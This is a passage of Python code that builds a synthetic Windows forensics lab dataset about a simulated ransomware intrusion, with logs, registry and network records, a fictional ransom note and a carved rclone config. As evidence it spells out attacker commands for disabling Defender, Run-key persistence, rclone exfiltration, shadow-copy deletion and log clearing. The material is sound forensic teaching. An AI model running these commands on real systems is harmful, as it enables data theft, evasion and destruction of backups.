        ("2024-11-10 23:38:14", "2024-11-11 00:24:02", 4, SVC_ACCOUNT,
         "persistence installed during this session"),
        ("2024-11-11 20:52:08", "2024-11-12 01:04:51", 5, SVC_ACCOUNT,
         "staging and exfiltration session"),
        ("2024-11-12 02:01:41", T_ACTOR_LOGOFF, 6, SVC_ACCOUNT,
         "evasion chain, log clear and encryption"),
    ]
    for t_in, t_out, sess, user, note in sessions:
        add(t_in, 1149, rcm, user, "User authentication succeeded",
            f"User={user} Domain={DOMAIN} SourceNetworkAddress={JUMP_IP} "
            f"Note={note}")
        add(t_in, 21, lsm, user, "Remote Desktop Services: Session logon "
                                 "succeeded",
            f"User={DOMAIN}\\{user} SessionID={sess} "
            f"SourceNetworkAddress={JUMP_IP}")
        t_shell = fmt_ts(parse_ts(t_in) + timedelta(seconds=3))
        add(t_shell, 22, lsm, user,
            "Remote Desktop Services: Shell start notification received",
            f"User={DOMAIN}\\{user} SessionID={sess} "
            f"SourceNetworkAddress={JUMP_IP}")
        add(t_out, 23, lsm, user,
            "Remote Desktop Services: Session logoff succeeded",
            f"User={DOMAIN}\\{user} SessionID={sess}")
    add("2024-11-11 23:41:07", 25, lsm, SVC_ACCOUNT,
        "Remote Desktop Services: Session reconnection succeeded",
        f"User={DOMAIN}\\{SVC_ACCOUNT} SessionID=5 "
        f"SourceNetworkAddress={JUMP_IP} "
        "Note=reconnect mid-exfiltration — the session dropped and resumed")
    add("2024-11-12 08:05:11", 1149, rcm, "ir-responder",
        "User authentication succeeded",
        f"User=ir-responder Domain={DOMAIN} SourceNetworkAddress=10.0.9.14 "
        "Note=incident response")

    # Legitimate administrative RDP before the intrusion.
    nrng = random.Random(stable_seed(world.seed, "ts-noise"))
    for day in (1, 4, 5):
        u = nrng.choice(NORMAL_USERS)
        add("2024-11-%02d %02d:%02d:%02d" % (
            day, nrng.randint(9, 16), nrng.randint(0, 59),
            nrng.randint(0, 59)),
            1149, rcm, u, "User authentication succeeded",
            f"User={u} Domain={DOMAIN} "
            f"SourceNetworkAddress=10.0.4.{nrng.randint(20, 120)} "
            "Note=routine administration")

    rows.sort(key=lambda r: r["TimeCreated"])
    for i, r in enumerate(rows):
        r["RecordNumber"] = str(88_412 + i)
    return rows


def generate_powershell_evtx(rng: random.Random, world: World
                             ) -> List[Dict[str, str]]:
    """PowerShell Operational (4103/4104) — the surviving command lines.

    Script-block logging is a separate channel from Security, so it survived
    the 02:09:41 clear. It is where the ``Set-MpPreference`` disable, the
    Defender exclusion, the 7-Zip staging command and the rclone invocation
    are still readable even though their 4688 records are gone.
    """
    rows: List[Dict[str, str]] = []
    ch = "Microsoft-Windows-PowerShell/Operational"

    def add(t, eid, desc, payload, user=SVC_ACCOUNT, level="Information"):
        rows.append({
            "RecordNumber": "0", "TimeCreated": ts(t), "EventID": str(eid),
            "Channel": ch, "Provider": "Microsoft-Windows-PowerShell",
            "Computer": FQDN, "UserName": user, "Level": level,
            "Description": desc, "Payload": payload,
        })

    def sb(t, script, note=""):
        add(t, 4104, "Creating Scriptblock text (1 of 1)",
            f"ScriptBlockText={script} Path= "
            f"ScriptBlockId={{{hexstr(random.Random(stable_seed(world.seed, t)), 8)}"
            f"-4a11-4c9e-9f21-118a4c00e1d2}}"
            + (f" Note={note}" if note else ""),
            level="Warning")

    add("2024-11-09 01:27:02", 400, "Engine state is changed from None to "
                                    "Available",
        "HostName=ConsoleHost HostApplication=powershell.exe "
        "EngineVersion=5.1.17763.6414")
    sb("2024-11-09 01:27:41",
       "Get-SmbShare | Select-Object Name,Path,Description",
       "share enumeration on the file server")
    sb("2024-11-09 01:28:19",
       "Get-ChildItem C:\\Shares -Directory -Recurse -Depth 2 | "
       "Select-Object FullName")
    sb("2024-11-09 01:31:44",
       "Get-ChildItem C:\\Shares -Recurse -File | "
       "Measure-Object -Property Length -Sum",
       "sizing the data set before deciding what to take")
    sb("2024-11-10 23:39:52",
       "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\"
       "CurrentVersion\\Run' -Name 'WindowsUpdateSvc' -Value "
       f"'{STAGING_DIR_FULL}\\rclone.exe --config "
       f"{STAGING_DIR_FULL}\\rclone.conf serve' -PropertyType String",
       "Run-key persistence")
    sb("2024-11-11 21:52:38",
       f"Add-MpPreference -ExclusionPath '{STAGING_DIR_FULL}'",
       "Defender exclusion — the 4688 for this is gone, the 4104 is not")
    sb("2024-11-11 21:53:01",
       "Add-MpPreference -ExclusionProcess 'rclone.exe'")
    sb("2024-11-11 21:13:58",
       f"& '{STAGING_DIR_FULL}\\7z.exe' a -v3g -mx1 -mhe "
       f"'{STAGING_DIR_FULL}\\{ARCHIVE_STEM}' "
       "'C:\\Shares\\Accounting' 'C:\\Shares\\Finance' 'C:\\Shares\\HR' "
       "'C:\\Shares\\Legal' 'C:\\Shares\\IT\\Backups\\SQL'",
       "THE STAGING COMMAND — names the source directories, which is how "
       "you scope what was taken when the archives themselves are gone")
    sb(T_EXFIL_START,
       f"& '{STAGING_DIR_FULL}\\rclone.exe' copy '{STAGING_DIR_FULL}' "
       "vault-remote:acct --config "
       f"'{STAGING_DIR_FULL}\\rclone.conf' --transfers 8 "
       "--multi-thread-streams 4 --ignore-existing -q",
       "no --log-file: there is no per-file transfer record")
    sb("2024-11-12 02:02:12",
       "Set-MpPreference -DisableRealtimeMonitoring $true "
       "-DisableBehaviorMonitoring $true -DisableIOAVProtection $true",
       "the Defender disable, six seconds before Defender 5001")
    sb("2024-11-12 02:04:41",
       "Get-Service | Where-Object {$_.DisplayName -match "
       "'backup|veeam|sql|acronis'} | Stop-Service -Force",
       "backup and database services stopped so their files are unlocked")
    sb("2024-11-12 02:06:29",
       "cmd /c 'vssadmin delete shadows /all /quiet'",
       "SHADOW COPY DELETION — this 4104 is the only place the exact "
       "command line survives; its 4688 was destroyed at 02:09:41")
    sb("2024-11-12 02:09:36",
       "wevtutil cl Security",
       "the log clear itself, five seconds before Security 1102")
    add(T_ACTOR_LOGOFF, 403,
        "Engine state is changed from Available to Stopped",
        "HostName=ConsoleHost EngineVersion=5.1.17763.6414")

    # Benign scheduled maintenance scripting.
    nrng = random.Random(stable_seed(world.seed, "ps-noise"))
    for day in (5, 6, 7, 8, 9, 10, 11, 12):
        add("2024-11-%02d 01:%02d:%02d" % (day, nrng.randint(0, 20),
                                           nrng.randint(0, 59)),
            4103, "Module logging — pipeline execution",
            "ContextInfo=Host Name = ConsoleHost "
            "User = FINANCE\\svc-monitor "
            "CommandLine=C:\\Scripts\\Get-ShareCapacity.ps1",
            user="svc-monitor")

    rows.sort(key=lambda r: r["TimeCreated"])
    for i, r in enumerate(rows):
        r["RecordNumber"] = str(412_007 + i)
    return rows


def generate_prefetch(rng: random.Random, world: World
                      ) -> List[Dict[str, str]]:
    """PECmd output.

    Application prefetching is not on by default on Windows Server; this
    host had ``EnablePrefetcher=3`` set by its build image, which is why
    Prefetch is available at all. Note ``VAULT.EXE`` has RunCount=1 — a
    single-run encryptor barely makes it to disk, and on many real servers
    it would not appear here at all.
    """
    rows: List[Dict[str, str]] = []
    prng = random.Random(stable_seed(world.seed, "prefetch"))

    def add(exe, run_count, last, prev0="", prev1="", prev2="", files=0):
        h = "".join(prng.choice("0123456789ABCDEF") for _ in range(8))
        rows.append({
            "SourceFilename": f"{exe}-{h}.pf", "ExecutableName": exe,
            "Hash": h, "RunCount": str(run_count), "LastRun": ts(last),
            "PreviousRun0": ts(prev0) if prev0 else "",
            "PreviousRun1": ts(prev1) if prev1 else "",
            "PreviousRun2": ts(prev2) if prev2 else "",
            "FilesCount": str(files), "VolumeName": VOL_GUID,
            "VolumeSerialNumber": VOL_SERIAL,
            "VolumeCreated": ts(VOL_CREATED),
        })

    add("VAULT.EXE", 1, T_ENCRYPTOR_EXEC, files=41)
    add("RCLONE.EXE", 3, T_EXFIL_START, "2024-11-11 21:03:02",
        "2024-11-11 20:59:14", files=62)
    add("7Z.EXE", 2, "2024-11-11 21:14:02", "2024-11-11 21:10:11", files=28)
    add("VSSADMIN.EXE", 2, T_VSSADMIN, "2024-11-09 01:41:22", files=34)
    add("WBADMIN.EXE", 1, T_WBADMIN, files=31)
    add("BCDEDIT.EXE", 2, "2024-11-12 02:11:47", T_BCDEDIT, files=19)
    add("PSEXESVC.EXE", 1, T_LATERAL, files=17)
    add("NETSCAN.EXE", 1, "2024-11-09 01:26:58", files=44)
    add("NET.EXE", 14, "2024-11-12 02:12:33", "2024-11-11 20:58:04",
        "2024-11-09 01:30:18", files=22)
    add("NET1.EXE", 14, "2024-11-12 02:12:34", "2024-11-11 20:58:05",
        files=20)
    add("NLTEST.EXE", 1, "2024-11-09 01:29:44", files=18)
    add("WHOAMI.EXE", 4, "2024-11-11 20:54:41", "2024-11-09 01:27:02",
        files=15)
    add("SYSTEMINFO.EXE", 1, "2024-11-09 01:28:02", files=27)
    add("TASKKILL.EXE", 3, "2024-11-12 02:13:11", "2024-11-12 02:12:58",
        files=21)
    add("POWERSHELL.EXE", 22, "2024-11-12 02:09:36", "2024-11-12 02:06:29",
        "2024-11-12 02:04:41", files=184)
    add("CMD.EXE", 47, "2024-11-12 03:41:20", "2024-11-12 03:39:10",
        "2024-11-12 02:13:52", files=32)
    add("WEVTUTIL.EXE", 1, "2024-11-12 02:09:36", files=24)
    add("CONHOST.EXE", 61, "2024-11-12 03:41:20", "2024-11-12 03:39:10",
        files=14)
    add("EXPLORER.EXE", 9, "2024-11-12 02:02:04", "2024-11-11 20:52:14",
        files=212)
    add("MMC.EXE", 6, "2024-11-11 20:55:31", "2024-11-09 01:33:02",
        files=148)
    add("SQLSERVR.EXE", 18, "2024-11-12 02:12:41", "2024-11-08 03:00:12",
        files=96)
    add("SVCHOST.EXE", 214, "2024-11-12 04:00:02", "2024-11-12 03:00:02",
        files=88)
    add("DEFRAG.EXE", 12, "2024-11-10 03:12:44", "2024-11-03 03:12:41",
        files=26)
    add("SEDSVC.EXE", 5, "2024-11-11 04:02:19", files=19)
    return rows


def generate_amcache(rng: random.Random, world: World
                     ) -> List[Dict[str, str]]:
    """AmcacheParser output — SHA-1 for every binary that ran.

    The SHA-1 for ``rclone.exe`` is the artifact that survives a rename: an
    actor who calls it ``svchost.exe`` still leaves a hash that matches the
    published rclone release.
    """
    rows: List[Dict[str, str]] = []
    arng = random.Random(stable_seed(world.seed, "amcache"))

    def add(path, size, ver, product, publisher, created, modified,
            compiled, bintype="pe64bit"):
        rows.append({
            "FullPath": path,
            "FileExtension": "." + path.rsplit(".", 1)[-1],
            "FileSize": str(size),
            "Sha1": hexstr(arng, 40), "Sha256": hexstr(arng, 64),
            "FileVersion": ver, "ProductName": product,
            "Publisher": publisher, "Created": ts(created),
            "LastModified": ts(modified), "Compiled": ts(compiled),
            "IsPeFile": "True", "BinaryType": bintype,
        })

    add(f"C:\\Windows\\Temp\\{ENCRYPTOR_NAME}", ENCRYPTOR_SIZE, "0.0.0.0",
        "", "(unsigned)", T_ENCRYPTOR_DROP, T_ENCRYPTOR_DROP,
        "2024-11-04 18:22:41")
    add(f"{STAGING_DIR_FULL}\\{RCLONE_NAME}", RCLONE_SIZE, "1.65.0.0",
        "Rclone", "https://rclone.org", "2024-11-11 20:58:41",
        "2024-11-11 20:58:41", "2023-11-26 00:00:00")
    add(f"{STAGING_DIR_FULL}\\7z.exe", 1180160, "23.1.0.0", "7-Zip",
        "Igor Pavlov", "2024-11-11 21:09:44", "2024-11-11 21:09:44",
        "2023-06-20 00:00:00")
    add("C:\\Windows\\Temp\\netscan.exe", 8394752, "8.1.0.0",
        "SoftPerfect Network Scanner", "SoftPerfect Pty Ltd",
        "2024-11-09 01:24:11", "2024-11-09 01:24:11", "2023-02-14 00:00:00")
    add("C:\\Windows\\PSEXESVC.exe", 194112, "2.40.0.0",
        "Sysinternals PsExec", "Sysinternals - www.sysinternals.com",
        T_LATERAL, T_LATERAL, "2023-10-11 00:00:00")
    for path, size, ver, product in [
        ("C:\\Windows\\System32\\vssadmin.exe", 141312, "10.0.17763.1",
         "Microsoft Windows Operating System"),
        ("C:\\Windows\\System32\\wbadmin.exe", 250880, "10.0.17763.1",
         "Microsoft Windows Operating System"),
        ("C:\\Windows\\System32\\bcdedit.exe", 424448, "10.0.17763.1",
         "Microsoft Windows Operating System"),
        ("C:\\Windows\\System32\\wevtutil.exe", 220160, "10.0.17763.1",
         "Microsoft Windows Operating System"),
        ("C:\\Windows\\System32\\net.exe", 63488, "10.0.17763.1",
         "Microsoft Windows Operating System"),
        ("C:\\Windows\\System32\\nltest.exe", 100352, "10.0.17763.1",
         "Microsoft Windows Operating System"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         451584, "10.0.17763.1", "Microsoft Windows Operating System"),
        ("C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\"
         "MSSQL\\Binn\\sqlservr.exe", 624736, "15.0.4326.1",
         "Microsoft SQL Server"),
    ]:
        add(path, size, ver, product, "Microsoft Corporation",
            "2023-04-18 08:14:41", "2024-10-09 04:11:22",
            "2023-09-14 00:00:00")
    return rows


def generate_shimcache(rng: random.Random, world: World
                       ) -> List[Dict[str, str]]:
    """AppCompatCacheParser output.

    ``Executed`` reads ``NA`` on every row: Windows 8 and later stopped
    populating the InsertFlags bit. A ShimCache row proves the path was
    *present*, not that it ran.
    """
    rows: List[Dict[str, str]] = []
    entries = [
        (f"C:\\Windows\\Temp\\{ENCRYPTOR_NAME}", T_ENCRYPTOR_DROP),
        (f"{STAGING_DIR_FULL}\\{RCLONE_NAME}", "2024-11-11 20:58:41"),
        (f"{STAGING_DIR_FULL}\\7z.exe", "2024-11-11 21:09:44"),
        ("C:\\Windows\\Temp\\netscan.exe", "2024-11-09 01:24:11"),
        ("C:\\Windows\\PSEXESVC.exe", T_LATERAL),
        ("C:\\Windows\\System32\\wevtutil.exe", "2023-04-18 08:14:41"),
        ("C:\\Windows\\System32\\vssadmin.exe", "2023-04-18 08:14:41"),
        ("C:\\Windows\\System32\\wbadmin.exe", "2023-04-18 08:14:41"),
        ("C:\\Windows\\System32\\bcdedit.exe", "2023-04-18 08:14:41"),
        ("C:\\Windows\\System32\\net.exe", "2023-04-18 08:14:41"),
        ("C:\\Windows\\System32\\net1.exe", "2023-04-18 08:14:41"),
        ("C:\\Windows\\System32\\nltest.exe", "2023-04-18 08:14:41"),
        ("C:\\Windows\\System32\\whoami.exe", "2023-04-18 08:14:41"),
        ("C:\\Windows\\System32\\systeminfo.exe", "2023-04-18 08:14:41"),
        ("C:\\Windows\\System32\\taskkill.exe", "2023-04-18 08:14:41"),
        ("C:\\Windows\\System32\\rundll32.exe", "2023-04-18 08:14:41"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "2023-04-18 08:14:41"),
        ("C:\\Windows\\System32\\cmd.exe", "2023-04-18 08:14:41"),
        ("C:\\Windows\\System32\\mmc.exe", "2023-04-18 08:14:41"),
        ("C:\\Windows\\explorer.exe", "2023-04-18 08:14:41"),
        ("C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\"
         "MSSQL\\Binn\\sqlservr.exe", "2024-06-11 02:41:00"),
        ("C:\\Program Files\\Windows Defender\\MpCmdRun.exe",
         "2024-10-09 04:11:22"),
    ]
    for i, (path, mtime) in enumerate(entries):
        rows.append({
            "ControlSet": SHIMCACHE_CONTROLSET,
            "CacheEntryPosition": str(i),
            "Path": path, "LastModifiedTimeUTC": ts(mtime),
            "Executed": SHIMCACHE_EXECUTED, "Duplicate": "False",
            "SourceFile": SHIMCACHE_SOURCE,
        })
    return rows


def _normalize_key_lastwrite(rows):
    """Force one LastWriteTime per registry key.

    In a real hive, LastWriteTime is a property of the KEY, not of the
    individual values under it — there is no per-value timestamp. A parser
    reporting different LastWriteTime values for two values in the same key
    is reporting something the registry cannot express.

    The correct value for every row under a key is the key's most recent
    write. Collapsing to the max here means the dataset teaches the same
    lesson the book does (Ch5 §5.1.2, Ch10 §10.5): a recent LastWriteTime
    tells you *something* under the key changed, not *which* value.
    """
    latest = {}
    for r in rows:
        lwt = (r.get("LastWriteTime") or "").strip()
        if not lwt:
            continue
        k = (r.get("Hive", ""), r.get("KeyPath", ""))
        if lwt > latest.get(k, ""):
            latest[k] = lwt
    for r in rows:
        if (r.get("LastWriteTime") or "").strip():
            r["LastWriteTime"] = latest[(r.get("Hive", ""), r.get("KeyPath", ""))]
    return rows


def generate_registry_runkeys(rng: random.Random, world: World
                              ) -> List[Dict[str, str]]:
    """Run / RunOnce values — the persistence inventory input."""
    rows: List[Dict[str, str]] = []

    def add(hive, key, name, data, vtype, lastwrite, notes):
        rows.append({
            "Hive": hive, "KeyPath": key, "ValueName": name,
            "ValueData": data, "ValueType": vtype,
            "LastWriteTime": ts(lastwrite), "Notes": notes,
        })

    run = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    add("HKLM", run, "WindowsUpdateSvc",
        f"{STAGING_DIR_FULL}\\rclone.exe --config "
        f"{STAGING_DIR_FULL}\\rclone.conf serve", "RegSz",
        "2024-11-10 23:39:52",
        "MALICIOUS — points into the actor's staging directory. The target "
        "was deleted at 03:41:22, so the value is now a dangling reference "
        "that would still be re-created on restore from a backup taken "
        "after 2024-11-10")
    add("HKLM", run, "SecurityHealth",
        "%windir%\\system32\\SecurityHealthSystray.exe", "RegExpandSz",
        "2023-04-18 08:14:41", "Benign — ships with Windows")
    add("HKLM", run, "VMware User Process",
        "\"C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\" -n vmusr",
        "RegSz", "2023-04-18 09:02:11", "Benign — hypervisor guest tools")
    add("HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        "(default)", "", "RegSz", "2023-04-18 08:14:41",
        "Empty — nothing pending")
    add("HKLM", "SYSTEM\\CurrentControlSet\\Control\\Terminal Server",
        "fDenyTSConnections", "0", "RegDword", "2024-11-09 01:21:07",
        "RDP is ENABLED. LastWrite is inside the dwell window — worth "
        "confirming against the change-management record")
    add("HKLM", "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\"
                "Real-Time Protection",
        "DisableRealtimeMonitoring", "1", "RegDword",
        "2024-11-12 02:02:21",
        "MALICIOUS — the registry side of Defender 5001/5007 at 02:02:18")
    add("HKLM", "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
        "DisableAntiSpyware", "1", "RegDword", "2024-11-12 02:02:24",
        "MALICIOUS — paired with the value above")
    add("HKLM", "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
        STAGING_DIR_FULL, "0", "RegDword", T_DEFENDER_EXCLUSION,
        "MALICIOUS — the exclusion that let rclone and 7z run unmolested")
    add("HKU", f"{SVC_SID}\\Software\\Microsoft\\Windows\\"
               "CurrentVersion\\Run",
        "OneDrive", "", "RegSz", "2023-06-02 11:04:18",
        "Benign leftover — empty value, product removed")
    rows = _normalize_key_lastwrite(rows)
    return rows


def generate_network_flow(rng: random.Random, world: World
                          ) -> List[Dict[str, str]]:
    """NetFlow-style records for ACCT-FS01.

    The 14 sessions to ``185.220.101.44`` between 22:41 on 2024-11-11 and
    00:52 on 2024-11-12 are the egress evidence. The destination has no
    prior contact in the retained window, which is what separates attacker
    infrastructure from a legitimate service.
    """
    rows: List[Dict[str, str]] = []

    def add(t0, t1, sip, sport, dip, dport, proto, bs, br, ps, pr,
            proc, notes):
        rows.append({
            "FlowStart": t0, "FlowEnd": t1, "SourceIP": sip,
            "SourcePort": str(sport), "DestIP": dip, "DestPort": str(dport),
            "Protocol": proto, "BytesSent": str(bs), "BytesReceived": str(br),
            "PacketsSent": str(ps), "PacketsReceived": str(pr),
            "OwningProcess": proc, "Notes": notes,
        })

    # --- the exfiltration --------------------------------------------------
    frng = random.Random(stable_seed(world.seed, "flow-exfil"))
    t0 = parse_ts(T_EXFIL_START)
    t1 = parse_ts(T_EXFIL_END)
    step = (t1 - t0).total_seconds() / EXFIL_SESSIONS
    base = EXFIL_TOTAL_BYTES // EXFIL_SESSIONS
    sent: List[int] = []
    for i in range(EXFIL_SESSIONS - 1):
        sent.append(base + frng.randint(-260_000_000, 260_000_000))
    sent.append(EXFIL_TOTAL_BYTES - sum(sent))
    for i, b in enumerate(sent):
        s = t0 + timedelta(seconds=step * i)
        e = s + timedelta(seconds=step * 0.94)
        add(fmt_flow(s), fmt_flow(e), HOST_IP, 49200 + i * 3, EXFIL_IP,
            EXFIL_PORT, "TCP", b, int(b * 0.0009), b // 1400,
            int(b * 0.0009) // 1400, "rclone.exe",
            "Exfiltration session %d/%d — TLS to an address with no prior "
            "contact in the retained window" % (i + 1, EXFIL_SESSIONS))

    # --- inbound RDP from the jump host ------------------------------------
    for t_in, t_out, note in [
        ("2024-11-09 01:26:41", "2024-11-09 03:11:20",
         "first interactive RDP session on ACCT-FS01"),
        ("2024-11-10 23:38:14", "2024-11-11 00:24:02",
         "persistence session"),
        ("2024-11-11 20:52:08", "2024-11-12 01:04:51",
         "staging and exfiltration session"),
        ("2024-11-12 02:01:41", "2024-11-12 04:12:44",
         "evasion, log clear and encryption session"),
    ]:
        dur = (parse_ts(t_out) - parse_ts(t_in)).total_seconds()
        add(t_in, t_out, JUMP_IP, 51882, HOST_IP, 3389, "TCP",
            int(dur * 1180), int(dur * 9400), int(dur * 1.9),
            int(dur * 7.2), "svchost.exe (TermService)", note)

    # --- SMB from the jump host --------------------------------------------
    add("2024-11-09 01:19:41", "2024-11-09 01:24:18", JUMP_IP, 50114,
        HOST_IP, 445, "TCP", 8_412_004, 214_882, 6104, 3211,
        "System", "PsExec service install and binary push")
    add("2024-11-11 20:57:22", "2024-11-11 21:10:04", JUMP_IP, 50221,
        HOST_IP, 445, "TCP", 66_120_448, 411_204, 47_802, 6104,
        "System", "rclone.exe and 7z.exe delivered over SMB — the byte "
                  "count matches the two binaries plus overhead")

    # --- benign background --------------------------------------------------
    nrng = random.Random(stable_seed(world.seed, "flow-noise"))
    for day in (6, 7, 8, 9, 10, 11, 12):
        for _ in range(6):
            h = nrng.randint(6, 19) if day != 12 else nrng.randint(0, 6)
            s = datetime(2024, 11, day, h, nrng.randint(0, 59),
                         nrng.randint(0, 59))
            e = s + timedelta(seconds=nrng.randint(20, 900))
            peer = nrng.choice(
                ["10.0.4.61", "10.0.4.77", "10.0.4.102", "10.0.6.41",
                 "10.0.0.10", "10.0.6.90"])
            port = nrng.choice([445, 445, 445, 389, 53, 5985])
            b_out = nrng.randint(40_000, 180_000_000)
            add(fmt_flow(s), fmt_flow(e), HOST_IP, nrng.randint(49152, 60000),
                peer, port, "TCP", b_out, nrng.randint(20_000, 4_000_000),
                b_out // 1400, nrng.randint(40, 3000), "System",
                "Routine file-server traffic")
    # Nightly backup pulls — the one legitimate high-volume egress pattern.
    for day in (6, 7, 8, 9, 10, 11):
        s = datetime(2024, 11, day, 1, 12, 0)
        e = s + timedelta(minutes=48)
        add(fmt_flow(s), fmt_flow(e), HOST_IP, 50914, BACKUP_IPS[0], 10002,
            "TCP", 214_748_364_800, 4_118_204, 153_391_689, 88_412,
            "veeamagent.exe",
            "Nightly backup job — legitimate, and far larger than the "
            "exfiltration. Volume alone is not the signal; destination is")

    rows.sort(key=lambda r: r["FlowStart"])
    return rows


def generate_srum(rng: random.Random, world: World) -> List[Dict[str, str]]:
    """SRUM network-usage rows.

    SRUM survives a Security log clear and records per-application bytes
    sent in roughly hourly buckets — which is why it is the single best
    host-side corroboration of an exfiltration when the actor cleaned up.
    """
    rows: List[Dict[str, str]] = []

    def add(t, app, sid, sent, recv):
        rows.append({
            "Timestamp": ts(t), "ApplicationName": app, "UserSID": sid,
            "InterfaceLuid": IFACE_LUID, "BytesSent": str(sent),
            "BytesReceived": str(recv), "EventTimestamp": ts(t),
        })

    # rclone: three hourly buckets spanning the transfer.
    shares = [0.41, 0.44, 0.15]
    buckets = ["2024-11-11 22:00:00", "2024-11-11 23:00:00",
               "2024-11-12 00:00:00"]
    allocated = 0
    for i, (b, frac) in enumerate(zip(buckets, shares)):
        val = (SRUM_RCLONE_BYTES - allocated if i == len(buckets) - 1
               else int(SRUM_RCLONE_BYTES * frac))
        allocated += val
        add(b, "rclone.exe", SVC_SID, val, int(val * 0.0008))

    add("2024-11-11 21:00:00", "7z.exe", SVC_SID, 18_412, 2_104)
    add("2024-11-12 02:00:00", "powershell.exe", SVC_SID, 214_882, 1_104_882)
    add("2024-11-12 03:00:00", "vault.exe", SVC_SID, 4_112, 1_884)
    add("2024-11-09 01:00:00", "netscan.exe", SVC_SID, 41_882_104, 8_412_004)

    nrng = random.Random(stable_seed(world.seed, "srum"))
    apps = ["svchost.exe", "System", "veeamagent.exe", "sqlservr.exe",
            "MsMpEng.exe", "explorer.exe"]
    for day in (6, 7, 8, 9, 10, 11, 12):
        for hour in (1, 4, 9, 13, 17, 21):
            if day == 12 and hour > 4:
                continue
            app = apps[(day + hour) % len(apps)]
            sent = (nrng.randint(180_000_000_000, 230_000_000_000)
                    if app == "veeamagent.exe"
                    else nrng.randint(100_000, 88_000_000))
            add("2024-11-%02d %02d:00:00" % (day, hour), app,
                nrng.choice([SVC_SID, "S-1-5-18"]), sent,
                nrng.randint(50_000, 12_000_000))

    rows.sort(key=lambda r: (r["Timestamp"], r["ApplicationName"]))
    return rows


# ---------------------------------------------------------------------------
# Plain-text outputs
# ---------------------------------------------------------------------------

def render_ransom_note(world: World) -> str:
    return f"""\
=====================================================================
                    {FAMILY.upper()} — YOUR NETWORK HAS BEEN LOCKED
=====================================================================

WHAT HAPPENED
-------------
Every document, database and backup on this server has been encrypted
with a unique key. Files now carry the extension .{ENC_EXT} and cannot be
opened by any application. Your shadow copies have been removed and your
backup catalog has been deleted. Recovery software will not help you.

Before encrypting, we copied {round(world.staged_bytes / 1024 ** 3)} GB of
your accounting, finance, HR and legal data to our storage. We hold
payroll registers, bank reconciliations, vendor contracts and tax
filings.

YOUR IDENTIFIER
---------------
    {VICTIM_ID}

Quote this identifier in every message. Without it we cannot locate
your key.

WHAT YOU MUST DO
----------------
1. Do not rename, move or modify the encrypted files. Doing so will
   destroy the data permanently.
2. Do not attempt third-party decryption tools. They do not work on
   this build and corrupted files cannot be restored afterwards.
3. Do not involve recovery companies. They will simply contact us and
   charge you a markup.
4. Contact us within 72 hours through the portal below.

CONTACT
-------
    hxxp://vault-recovery-portal[.]onion/{VICTIM_ID}

Use the Tor Browser. Enter your identifier on the landing page. A
support operator will respond and provide payment instructions and a
free test decryption of two files under 2 MB.

TIMELINE
--------
    Hours 0-72     Current price.
    Hours 72-168   Price doubles.
    After 168 h    Your data is published on our leak site and your
                   customers, partners and regulator are notified.

We are not interested in your reputation. We are interested in payment.
The faster you contact us, the cheaper and quieter this ends.

=====================================================================
This file is dropped in every directory we encrypted. Do not delete it.
=====================================================================

---------------------------------------------------------------------
SIMULATED ARTIFACT. "Vault", the .{ENC_EXT} extension, the identifier
{VICTIM_ID} and the contact URL above are fictional and exist only for
the Windows Forensics for Beginners lab material. The URL is defanged
and does not resolve. No real ransomware family, leak site, payment
address or victim is referenced anywhere in this dataset.
---------------------------------------------------------------------
"""


def render_rclone_conf(world: World) -> str:
    return f"""\
# ---------------------------------------------------------------------
# rclone.conf — RECOVERED FROM UNALLOCATED SPACE
#
# Source:   {STAGING_DIR_FULL}\\rclone.conf (MFT entry marked InUse=False;
#           the file was deleted at 2024-11-12 03:41:22 UTC together with
#           the rest of the staging directory)
# Method:   resident $DATA carved from the MFT record, cross-checked
#           against the file-slack copy in unallocated clusters
# Analyst:  IR-2024-ACCTFS01
#
# This is the highest-value single artifact in the exfiltration half of
# the case: it names the transfer protocol, the endpoint and the remote
# name that appears in the PowerShell 4104 command line.
# ---------------------------------------------------------------------

[vault-remote]
type = webdav
url = https://{EXFIL_IP}:{EXFIL_PORT}/dav
vendor = other
user = acct
pass = <obfuscated by rclone; reversible with rclone obscure -->
pacer_min_sleep = 10ms

# Recovered fragment of the shell history that used it:
#   rclone.exe copy "{STAGING_DIR_FULL}" vault-remote:acct \\
#     --config "{STAGING_DIR_FULL}\\rclone.conf" \\
#     --transfers 8 --multi-thread-streams 4 --ignore-existing -q
#
# NOTE THE ABSENCE OF --log-file. There is therefore no per-file record
# of what was transferred. The staged set is known only at archive-volume
# granularity ({ARCHIVE_VOLUMES} volumes, {world.staged_bytes} bytes total)
# and at source-directory granularity from the 7-Zip command line in
# powershell-evtx.csv. That gap is what keeps the exfiltration finding at
# "highly likely" rather than "confirmed".
"""


def render_vssadmin_output(world: World) -> str:
    return f"""\
# Output of `vssadmin list shadows` run on {HOSTNAME} by the responding
# analyst at 2024-11-12 08:14:02 UTC, during live triage and before the
# host was imaged. Captured to file and hashed at collection.

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

No items found that satisfy the query.

# ---------------------------------------------------------------------
# Interpretation
#
# There are no shadow copies on this volume. Corroborating evidence that
# this is deletion rather than a host that never had them:
#
#   * system-evtx.csv     volsnap EID 25, four records, 02:06:34-02:06:41
#   * prefetch.csv        VSSADMIN.EXE  RunCount=2  LastRun 02:06:33
#   * powershell-evtx.csv 4104 at 02:06:29 carrying the exact command line
#                         `cmd /c 'vssadmin delete shadows /all /quiet'`
#   * amcache.csv         vssadmin.exe present with a SHA-1
#
# The Security 4688 for vssadmin.exe does NOT survive: the log was cleared
# at 02:09:41, three minutes after the deletion. This is the worked
# example of Chapter 12 section 12.4.5 — a cleared log relocates the
# investigation, it does not end it.
# ---------------------------------------------------------------------
"""


# ---------------------------------------------------------------------------
# Dispatch table
# ---------------------------------------------------------------------------

GENERATORS: Dict[str, Callable[[random.Random, World], List[Dict[str, str]]]] = {
